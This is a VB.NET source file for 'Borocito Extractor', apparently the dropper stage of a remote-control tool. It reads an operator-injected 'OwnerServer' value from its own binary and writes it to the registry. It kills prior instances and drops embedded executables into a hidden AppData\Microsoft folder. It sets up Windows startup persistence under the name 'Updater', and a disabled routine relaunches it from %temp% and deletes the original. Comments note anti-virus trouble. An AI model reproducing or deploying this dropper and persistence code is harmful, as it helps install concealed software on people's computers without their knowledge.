Imports System.IO
Imports Microsoft.Win32
Module GlobalUses
    Public parameters As String
    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
    Public DIRTemp As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Temp"

    Public OverrideOwner As Boolean = False
End Module
Module Utility
    Sub AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False)
        Try
            Dim OverWrite As Boolean = False
            If My.Computer.FileSystem.FileExists(DIRCommons & "\Extractor.log") Then
                OverWrite = True
            End If
            Dim finalContent As String = Nothing
            If flag = True Then
                finalContent = " [!!!]"
            End If
            Dim Message As String = DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & finalContent & " [" & from & "] " & content
            Console.WriteLine("[" & from & "]" & finalContent & " " & content)
            Try
                My.Computer.FileSystem.WriteAllText(DIRCommons & "\Extractor.log", vbCrLf & Message, OverWrite)
            Catch
            End Try
        Catch ex As Exception
            Console.WriteLine("[AddToLog@Utility]Error: " & ex.Message)
        End Try
    End Sub
End Module
Module Memory
    Public OwnerServer As String = Nothing
    Sub LoadInject()
        Try
            AddToLog("LoadInject@Memory", "Cargando datos inyectados...", False)
            FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
            Dim stubb As String = Space(LOF(1))
            Dim FileSplit = "|BRO|"
            FileGet(1, stubb)
            FileClose(1)
            Dim opt() As String = Split(stubb, FileSplit)
            OwnerServer = opt(1)
        Catch ex As Exception
            AddToLog("LoadInject@Memory", "Error: " & ex.Message, True)
            End
        End Try
    End Sub
End Module
Module StartUp
    Sub Init()
        AddToLog("Init", "Borocito Extractor " & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")" & " has started! " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy"), True)
        Threading.Thread.Sleep(5000)
        Try
            'Inicia desde otra ubicacion
            'RunFromLocation()
            'Evita multi-instancias
            OnlyOneInstance()
            'Crear las carpetas necesarias en raiz
            CreateRootFolders()
            'Ver si ya existe una instancia anterior
            CheckIfExist()
            'Extraer
            StartExtract()
            'Crear registro para iniciar con Windows
            StartWithWindows()
            'Iniciar
            InitUpdater()
        Catch ex As Exception
            AddToLog("Init@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub OnlyOneInstance()
        Try
            AddToLog("OnlyOneInstance@StartUp", "Checking instances...", True)
            Dim p = Process.GetProcessesByName(IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath))
            If p.Count > 1 Then
                AddToLog("OnlyOneInstance@StartUp", "Instance detected!, closing me...", True)
                End
            Else
                AddToLog("OnlyOneInstance@StartUp", "No instances detected!, starting...", True)
            End If
        Catch ex As Exception
            AddToLog("OnlyOneInstance@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub RunFromLocation()
        Try
            If Application.StartupPath.Contains("Local\Temp") = False Then
                AddToLog("RunFromLocation@StartUp", "No se esta ejecutando desde %temp%, reejecutando...", False)
                If My.Computer.FileSystem.FileExists(DIRTemp & "\BoroExtractor.exe") Then
                    My.Computer.FileSystem.DeleteFile(DIRTemp & "\BoroExtractor.exe")
                End If
                My.Computer.FileSystem.CopyFile(Application.ExecutablePath, DIRTemp & "\BoroExtractor.exe")
                Process.Start(DIRTemp & "\BoroExtractor.exe", parameters)
                If Application.ExecutablePath.StartsWith("C") Then
                    Process.Start("cmd.exe", "/c del " & Application.ExecutablePath)
                End If
                End
            Else
                AddToLog("RunFromLocation@StartUp", "Se esta ejecutando desde %temp%", False)
                If My.Computer.FileSystem.FileExists(DIRCommons & "\BorocitoExtractor.exe") Then
                    My.Computer.FileSystem.DeleteFile(DIRCommons & "\BorocitoExtractor.exe")
                End If
                My.Computer.FileSystem.CopyFile(Application.ExecutablePath, DIRCommons & "\BorocitoExtractor.exe")
            End If
        Catch ex As Exception
            AddToLog("RunFromLocation@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub CreateRootFolders()
        Try
            If Not My.Computer.FileSystem.DirectoryExists(DIRCommons) Then
                My.Computer.FileSystem.CreateDirectory(DIRCommons)
            End If
        Catch ex As Exception
            AddToLog("CreateRootFolders@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module
Module Extractor
    Sub CheckIfExist()
        Try
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
            If regKey Is Nothing Then
                AddToLog("CheckIfExist@Extractor", "Escribiendo valores en el registro...", False)
                SetExistence()
            Else
                If regKey.GetValue("OwnerServer") = Nothing Then
                    SetExistence()
                End If
                If OverrideOwner Then
                    AddToLog("CheckIfExist@Extractor", "Sobreescribiendo valores en el registro...", False)
                    regKey.SetValue("OwnerServer", OwnerServer, RegistryValueKind.String)
                End If
                AddToLog("CheckIfExist@Extractor", "Leyendo valores del registro...", False)
                OwnerServer = regKey.GetValue("OwnerServer")
            End If
        Catch ex As Exception
            AddToLog("CheckIfExist@Extractor", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub SetExistence()
        Try
            LoadInject() 'Lee los datos del inyectado
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
            Registry.CurrentUser.CreateSubKey("SOFTWARE\\Borocito")
            regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
            regKey.SetValue("OwnerServer", OwnerServer, RegistryValueKind.String)
        Catch ex As Exception
            AddToLog("SetExistence@Extractor", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub StartExtract()
        Try
            AddToLog("StartExtract@StartUp", "Inicializando Extractor...", False)
            Try
                Dim Borocito = Process.GetProcessesByName("Borocito")
                For i As Integer = 0 To Borocito.Count - 1
                    Borocito(i).Kill()
                Next i
            Catch ex As Exception
                AddToLog("StartExtract(KillProc(0))@Extractor", "Error: " & ex.Message, True)
            End Try
            Try
                Dim Updater = Process.GetProcessesByName("BorocitoUpdater")
                For i As Integer = 0 To Updater.Count - 1
                    Updater(i).Kill()
                Next i
            Catch ex As Exception
                AddToLog("StartExtract)KillProc(1))@Extractor", "Error: " & ex.Message, True)
            End Try
            Try
                Dim Updater = Process.GetProcessesByName("BoroUpdater")
                For i As Integer = 0 To Updater.Count - 1
                    Updater(i).Kill()
                Next i
            Catch ex As Exception
                AddToLog("StartExtract(KillProc(2))@Extractor", "Error: " & ex.Message, True)
            End Try
            Try
                If My.Computer.FileSystem.FileExists(DIRCommons & "\Borocito.exe") Then
                    My.Computer.FileSystem.DeleteFile(DIRCommons & "\Borocito.exe")
                End If
                My.Computer.FileSystem.WriteAllBytes(DIRCommons & "\Borocito.exe", My.Resources.Borocito, False)
            Catch ex As Exception
                AddToLog("StartExtract(CopyTo(0))@Extractor", "Error: " & ex.Message, True)
            End Try
            Try
                If My.Computer.FileSystem.FileExists(DIRCommons & "\BorocitoUpdater.exe") Then
                    My.Computer.FileSystem.DeleteFile(DIRCommons & "\BorocitoUpdater.exe")
                End If
                My.Computer.FileSystem.WriteAllBytes(DIRCommons & "\BorocitoUpdater.exe", My.Resources.BorocitoUpdater, False)
            Catch ex As Exception
                AddToLog("StartExtract(CopyTo(1))@Extractor", "Error: " & ex.Message, True)
            End Try
        Catch ex As Exception
            AddToLog("StartExtract@Extractor", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub StartWithWindows()
        Try
            AddToLog("StartWithWindows@StartUp", "Making Borocito start with Windows...", False)
            Dim StartupShortcut As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.lnk"
            If Not My.Computer.FileSystem.FileExists(StartupShortcut) Then
                Dim WSHShell As Object = CreateObject("WScript.Shell")
                Dim Shortcut As Object = WSHShell.CreateShortcut(StartupShortcut)
                Shortcut.IconLocation = DIRCommons & "\BorocitoUpdater.exe,0"
                Shortcut.TargetPath = DIRCommons & "\BorocitoUpdater.exe"
                Shortcut.WindowStyle = 1
                Shortcut.Description = "Updater software for Borocito"
                Shortcut.Save()
                My.Computer.FileSystem.CopyFile(DIRCommons & "\BorocitoUpdater.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Updater.exe")
            End If
        Catch ex As Exception
            AddToLog("StartWithWindows@Extractor", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub InitUpdater()
        Try
            AddToLog("InitUpdater@StartUp", "Iniciando Updater...", False)
            Process.Start(DIRCommons & "\BorocitoUpdater.exe")
            'Dim threadMonitoring = New Threading.Thread(Sub() Monitoring("Boro Defender System", 120000))
            'threadMonitoring.Start()
            End 'el END detendra el thread de monitoreo (bruh obvio)
        Catch ex As Exception
            AddToLog("InitAll@Extractor", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub Monitoring(ByVal procName As String, Optional ByVal timeOut As Integer = 90000)
        Try
            Threading.Thread.Sleep(timeOut) '2 minutos
            Dim p() As Process = Process.GetProcessesByName(procName)
            While True
                If p.Count > 0 Then
                    ' Process is running
                    AddToLog("Monitoring", "The proccess is running! Closing...", False)
                    End
                Else
                    ' Process is not running
                    AddToLog("Monitoring", "The proccess is not running! Starting...", False)
                    SecondStage()
                End If
            End While
        Catch ex As Exception
            AddToLog("Monitoring@Extractor", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub SecondStage()
        Try
            AddToLog("Extractor", "Inicializing Second Stage...", False)

            'La idea es poder iniciar una instancia descargada desde internet.
            'Por esta razon, esta etapa no estara lista en algun tiempo.

            AddToLog("Extractor", "Closing Second Stage...", False)
            End
        Catch ex As Exception
            AddToLog("PlanB@Extractor", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module
' THIS EXECUTABLE IS DISCONTINUED BY DESIGN.
' I RECOMMEND TO YOU USE POWERSHELL TO MAKE WHAT THIS WAS USED TO DO.
' I WILL STILL UPDATE THIS ASSEMBLY, BUT YOU MAY HAVE TROUBLES WITH ANTI-VIRUS AND ANOTHER PROBLEMS.